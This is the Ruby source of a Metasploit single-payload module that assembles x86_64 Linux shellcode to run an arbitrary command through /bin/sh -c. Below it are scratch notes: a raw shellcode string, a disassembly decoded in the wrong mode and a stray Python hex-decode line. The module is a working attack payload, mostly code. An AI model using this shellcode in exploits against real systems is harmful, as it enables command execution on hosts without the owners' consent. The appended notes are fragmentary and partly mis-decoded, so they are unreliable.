
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

module Metasploit3

  CachedSize = 47

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Execute Command',
      'Description'   => 'Execute an arbitrary command',
      'Author'        => 'ricky',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86_64))

    register_options(
      [
        OptString.new('CMD',  [ true,  "The command string to execute" ]),
      ], self.class)
  end

  def generate_stage(opts={})
    cmd = (datastore['CMD'] || '') + "\x00"
    call = "\xe8" + [cmd.length].pack('V')
    payload =
      "\x6a\x3b"                     + # pushq  $0x3b
      "\x58"                         + # pop    %rax
      "\x99"                         + # cltd
      "\x48\xbb\x2f\x62\x69\x6e\x2f" + # movabs $0x68732f6e69622f,%rbx
      "\x73\x68\x00"                 + #
      "\x53"                         + # push   %rbx
      "\x48\x89\xe7"                 + # mov    %rsp,%rdi
      "\x68\x2d\x63\x00\x00"         + # pushq  $0x632d
      "\x48\x89\xe6"                 + # mov    %rsp,%rsi
      "\x52"                         + # push   %rdx
      call                           + # callq  2d <run>
      cmd                            + # .ascii "cmd\0"
      "\x56"                         + # push   %rsi
      "\x57"                         + # push   %rdi
      "\x48\x89\xe6"                 + # mov    %rsp,%rsi
      "\x0f\x05"                       # syscall
  end
end



"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x05\x00\x00\x00"

#\x68\x65\x6c\x6c\x00\x56\x57\x48\x89\xe6\x0f\x05"


#exec



"""


00000000  6A3B              push byte +0x3b
00000002  58                pop eax
00000003  99                cdq
00000004  48                dec eax
00000005  BB2F62696E        mov ebx,0x6e69622f
0000000A  2F                das
0000000B  7368              jnc 0x75
0000000D  005348            add [ebx+0x48],dl
00000010  89E7              mov edi,esp
00000012  682D630000        push dword 0x632d
00000017  48                dec eax
00000018  89E6              mov esi,esp
0000001A  52                push edx

0000001B  E805000000        call dword 0x25

00000020  68656C6C00        push dword 0x6c6c65


00000025  56                push esi
00000026  57                push edi
00000027  48                dec eax
00000028  89E6              mov esi,esp
0000002A  0F05              syscall
"""



print "56C6C00".decode("hex")